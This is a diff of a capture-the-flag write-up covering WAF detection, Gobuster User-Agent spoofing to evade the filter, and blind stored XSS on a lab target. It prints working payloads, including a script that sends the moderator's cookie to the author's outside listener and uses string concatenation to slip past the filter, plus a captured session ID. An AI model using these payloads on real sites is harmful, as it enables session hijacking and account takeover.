@@ -70,24 +70,59 @@ Since this behavior was not required for exploitation, I continued with the main
 ---
 
 ### 2. Initial Web Access & WAF Detection
+To better understand how the web server handles requests, I sent a manual HTTP request using `curl`.
 ```
 curl 10.67.171.240
 ```
-**Response:**
+**Server response:**
 ```html
 403 FORBIDDEN  
 Web Application Firewall is ACTIVE
 ```
-**Observations:**
-- Automated tools blocked
-- Signature-based WAF detected
+**Analysis**
+The server immediately returned a 403 Forbidden response.
+
+**This confirms that:**
+- Direct requests are being actively filtered
+- A Web Application Firewall (WAF) is deployed
+
+**The error message explicitly states:**
+"Web Application Firewall is ACTIVE"
+
+**This strongly indicates:**
+- Request inspection is enabled
+- Certain patterns and headers are being analyzed
+- Automated tools are likely blocked by default
 
 ---
 
 ### 3. WAF Bypass (User-Agent Spoofing)
-The Web Application Firewall blocked Gobuster requests based on its default User-Agent,  
-indicating **signature-based detection**.
+After confirming the presence of a Web Application Firewall,
+I attempted directory enumeration using Gobuster.
 
+However, the default Gobuster requests were **blocked immediately.**
+
+**This indicated:**
+- The WAF inspects HTTP headers
+- Specifically the User-Agent
+- Blocking known scanner signatures
+
+#### Understanding the Block
+
+**Most automated tools (Gobuster, Nikto, Dirb) use:**
+-Static User-Agent strings
+- Easily fingerprinted patterns
+- Known signatures stored in WAF rulesets
+
+**Example:**
+```
+User-Agent: gobuster/3.6
+```
+This makes detection trivial.
+
+#### Bypassing the WAF
+
+To evade detection, I spoofed a legitimate browser User-Agent:
 ```bash
 gobuster dir -u http://10.67.171.240/-w /usr/share/wordlists/dirb/common.txt-a Mozilla/5.0
 ```
@@ -102,13 +137,24 @@ gobuster dir -u http://10.67.171.240/-w /usr/share/wordlists/dirb/common.txt-a M
 | /php.ini       | 403    | Blocked       |
 | /server-status | 403    | Blocked       |
 
-/config is blocked by the firewall but /logs is not. 
+#### Analysis
 
-**How does this work?**
+**We now know:**
+- WAF allows browser-like traffic
+- Automated tools are blocked by signature
+- /logs is publicly accessible
+- /config exists but is restricted
 
-This works because the WAF relies on **static pattern matching**.  
-Automated tools like Gobuster use recognizable User-Agent strings.  
-By spoofing a real browser (Mozilla/5.0), we blend into normal traffic.
+**This confirms:**
+- The WAF uses static pattern matching instead of behavioral analysis.
+
+#### Security Impact
+
+**In real environments this means:**
+- Attackers can bypass protection easily
+- Enumeration becomes trivial
+- Sensitive directories get exposed
+- WAF gives false sense of security
 
 ---
 
@@ -118,7 +164,7 @@ By spoofing a real browser (Mozilla/5.0), we blend into normal traffic.
 /logs/error.log
 ```
 **Findings:**
-- Possible encoded XSS payload detected
+- Possible encoded or obfuscated XSS payload detected
 - Failed to parse admin_info in: `/var/www/html/config/app.conf`
 
 **Conclusion:**
@@ -129,7 +175,8 @@ By spoofing a real browser (Mozilla/5.0), we blend into normal traffic.
 ---
 
 ### 5. Blind XSS Discovery
-We now know that we can maybe use a xss payload against the website to get a moderator cookie. first we start with a simple payload and see if we get a response on my own machine.
+Based on the log file findings, I suspected a stored XSS vulnerability.
+To confirm this, I injected a simple HTML payload and monitored my own server.
 
 ```html
 <img src="http://10.67.101.111:8000" />
@@ -141,38 +188,98 @@ python3 -m http.server 8000
 ```sql
 GET / HTTP/1.1
 ```
-**What this proves:**
-- Payload stored server-side
-- Admin/moderator views it
-- Browser executes it
-- We see it remotely → Blind XSS
+
+**This proves:**
+- My input was stored in the application
+- A privileged user (moderator/admin) viewed the page
+- Their browser executed my payload
+- The request reached my server
+
+**This is the definition of:**
+- Blind XSS
+Why is this dangerous?
+
+**Blind XSS is extremely dangerous because:**
+- The attacker never sees the page
+- Payloads execute in high-privilege contexts
+
+**Can lead to:**
+- Session hijacking
+- Account takeover
+- CSRF
+- Internal network attacks
 
 ---
 
 ### 6. WAF Evasion – Cookie Exfiltration
-First i tried script to test of the firewall will block that, but it didn't so thats good. and the i tried document.cookie but that didn't work. so now iknow the firewall will block it. but document["coo"+"kie"] werkte wel. 
+After confirming blind XSS, the next goal was to steal the moderator session cookie.
 
-**Blocked:**
-```html
-<script> var i=new Image(); i.src="http://ATTACKER/?c="+document.cookie </script>
+#### Step 1: Identify WAF filtering behavior
+
+**I first tested if JavaScript itself was blocked:**
 ```
-**Bypass:**
+<script>alert(1)</script>
+```
+**Allowed**
+
+**Next, I tested:**
+```
+document.cookie
+```
+**Blocked**
+
+#### Conclusion
+
+**The WAF does not block:**
+- <script> tags
+
+**But does block:**
+- The literal string document.cookie
+
+This confirms a **signature-based WAF.**
+
+#### Step 2: Bypass using string concatenation
+
+**To evade detection, I used:**
+```
+document["coo"+"kie"]
+```
+
+**Why this works:**
+- Browser concatenates → `cookie`
+- WAF scans raw input
+- Does NOT see "`cookie`"
+- Filter bypassed
+
+
+#### Step 3: Final exfiltration payload
 ```html
 <script> var i=new Image(); i.src="http://10.67.101.111:9001/?c="+document["coo"+"kie"] </script>
 ```
+#### Step 4: Listener setup
 ```bash
 python3 -m http.server 9001
 ```
-**Captured:**
+#### Step 5: Cookie captured
 ```ini
 PHPSESSID=e1omj7ther5rnh0g5ks70vjn84
 ```
 
-**Why this works?**
-- Browser concatenates → cookie
-- WAF scans raw input
-- Does NOT see "cookie"
-- Filter bypassed
+**This attack works because:**
+1. Payload is stored server-side
+2. Moderator loads the page
+3. JavaScript executes in their browser
+4. Cookie is appended to URL
+5. Browser sends request to attacker
+6. Session token is stolen
+
+#### Impact
+
+**With this cookie:**
+- I fully impersonated the moderator
+- No password required
+- Session hijacking achieved
+**Privilege escalation successful**
 
 ---
 
